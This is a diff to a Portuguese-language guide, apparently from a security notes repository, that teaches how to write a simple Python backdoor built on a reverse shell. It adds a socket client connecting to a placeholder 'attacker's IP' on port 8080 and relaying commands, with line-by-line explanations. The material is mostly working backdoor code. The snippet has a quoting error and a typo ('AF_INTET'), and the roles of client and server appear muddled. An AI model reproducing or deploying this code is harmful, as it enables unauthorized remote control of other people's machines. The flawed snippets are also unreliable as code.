@@ -12,7 +12,7 @@ tags: [Backdoor, APT-Técnicas]
 > [!NOTE]
 > Conteúdo desse Guia
 * Como funciona um Backdoor
-* Como fazer um simples Backdoor usando python
+* Como fazer um simples Backdoor com servidor e cliente usando python
 
 # um Backdoor simples em python
 Nesse exemplo demonstro um Backdoor que usa uma reverse shell e estabelece uma conexão com o alvo para a maquina
@@ -113,3 +113,29 @@ while True:
 
 ```print(output.decode())```
 * a resposta recebida é convertida de bytes de volta para uma string decode() e é impressa no terminal do servidor.
+
+
+# Cliente
+
+```
+import socket
+
+#comunicação do socket com o servidor
+c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+c.connect(('attacker's IP', 8080)) #novamente, mude a porta ou ip se quiser
+
+while True:
+    output = c.recv(1024)
+    print(output.decode())
+
+    command = input(">>> ")
+    c.send(command.encode())
+```
+
+```c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)```
+* cria um objeto de socket chamado c
+* socket.AF_INTET indica que o socket usará o protocolo IPv4
+* socket.SOCK_STREAM especifica que o socket será do tipo TCP
+
+```c.connect(('attacker's IP', 8080))```
+* método conect() tenta estabelecer uma conexão com o servidor em tal ip e porta
